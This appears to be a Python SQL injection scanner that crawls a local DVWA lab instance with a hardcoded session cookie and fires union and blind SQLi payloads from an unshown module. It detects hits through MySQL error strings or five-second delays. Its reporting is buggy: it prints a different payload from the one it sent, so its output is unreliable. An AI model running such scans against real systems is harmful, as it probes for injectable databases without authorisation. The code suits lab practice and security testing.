import connect
import sqliPayload
import random
class sqlDetect:
    
    def __init__(self):
        self.error_msg = ["8978954","You have an error in your SQL syntax", "Warning: mysql_fetch_array()" , "Uncaught TypeError: mysqli_num_rows()"]

    def connect(self, payloads, url, params, cookie, method):
        from connect import connect
        import datetime
        conn = connect()
        check = 0 
        j = 5

        if method == "POST" or method == "post":
            for payload in payloads:
                if j == 0:
                    break
                x = random.randrange(0,len(payloads))
                a = datetime.datetime.now()
                resp = conn.postt(url,params, payloads[x], cookie)
                b = datetime.datetime.now()
                c = b - a
                for err in self.error_msg:
                    if err in resp.text:
                        check = 1
                        print( "Sqli "+ url + " Payload: "+ payload) 
                        break
                if c.seconds >= 5:
                    check = 1
                    print( "Sqli "+ url + " Payload: "+ payload) 
                    break
                    
                if check == 1:
                    break
                j = j - 1
        elif method == "GET" or method == "get":
            for payload in payloads:
                if j == 0:
                    break
                x = random.randrange(0,len(payloads))
                a = datetime.datetime.now()
                resp = conn.gett(url,params, payloads[x], cookie)

                b = datetime.datetime.now()
                c = b - a
                for err in self.error_msg:
                    if err in str(resp.content):
                        check = 1
                        print( "Sqli "+ url + " Payload: "+ payload) 
                        break

                if c.seconds >= 5:
                    check = 1
                    print( "Sqli "+ url + " Payload: "+ payload) 
                    break
                     
                if check == 1:
                    break
                j = j - 1    
        

    def unionDetect(self, url, method, params, cookie):
        from sqliPayload import sqliPayload
        payload = sqliPayload()
        payloads = list(payload.generator_union_sql())
        self.connect(payloads, url, params, cookie, method)

    def boleanDetect(self, url, method, params, cookie):
        from sqliPayload import sqliPayload
        payload = sqliPayload()
        payloads = list(payload.generator_blind_sql())
        self.connect(payloads, url, params, cookie, method)

from crawler import crawler
a = sqlDetect()
cookie = {"PHPSESSID" : "f2c280e624310d43cafd4cebf90a1768", "security": "low"}
crawl = crawler("http://localhost/dvwa/", [] ,cookie)
listedCrawl = crawl.run_crawler()

for i in listedCrawl:
    print(i)



    a.boleanDetect(i[0],i[1],i[2], cookie )

